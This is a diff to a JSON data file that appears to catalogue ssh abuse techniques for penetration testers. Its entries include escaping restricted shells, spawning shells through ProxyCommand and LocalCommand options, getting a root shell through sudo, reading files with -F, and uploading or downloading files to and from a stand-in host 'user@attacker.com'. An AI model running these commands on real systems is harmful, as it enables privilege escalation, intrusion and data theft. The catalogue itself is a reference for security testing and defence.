@@ -3,35 +3,39 @@
     "shell": [
       {
         "description": "Reconnecting may help bypassing restricted shells.",
-        "code": "ssh localhost $SHELL --noprofile --norc"
+        "code": "ssh localhost $SHELL --noprofile --norc\n"
       },
       {
         "description": "Spawn interactive shell through ProxyCommand option.",
-        "code": "ssh -o ProxyCommand=';sh 0<&2 1>&2' x"
+        "code": "ssh -o ProxyCommand=';sh 0<&2 1>&2' x\n"
+      },
+      {
+        "description": "Spawn interactive shell on client, requires a successful connection towards `host`.",
+        "code": "ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh host\n"
       }
     ],
     "file-upload": [
       {
         "description": "Send local file to a SSH server.",
-        "code": "ssh [user@host] \"cat > [destination_file]\" < [source_file]\n"
+        "code": "HOST=user@attacker.com\nRPATH=file_to_save\nLPATH=file_to_send\nssh $HOST \"cat > $RPATH\" < $LPATH\n"
       }
     ],
     "file-download": [
       {
         "description": "Fetch a remote file from a SSH server.",
-        "code": "ssh [user@host] \"cat [source_file]\" > [destination_file]\n"
+        "code": "HOST=user@attacker.com\nRPATH=file_to_get\nLPATH=file_to_save\nssh $HOST \"cat $RPATH\" > $LPATH\n"
       }
     ],
     "file-read": [
       {
         "description": "The read file content is corrupted by error prints.",
-        "code": "ssh -F [file] localhost\n"
+        "code": "LFILE=file_to_read\nssh -F $LFILE localhost\n"
       }
     ],
     "sudo": [
       {
         "description": "Spawn interactive root shell through ProxyCommand option.",
-        "code": "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x"
+        "code": "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x\n"
       }
     ]
   }
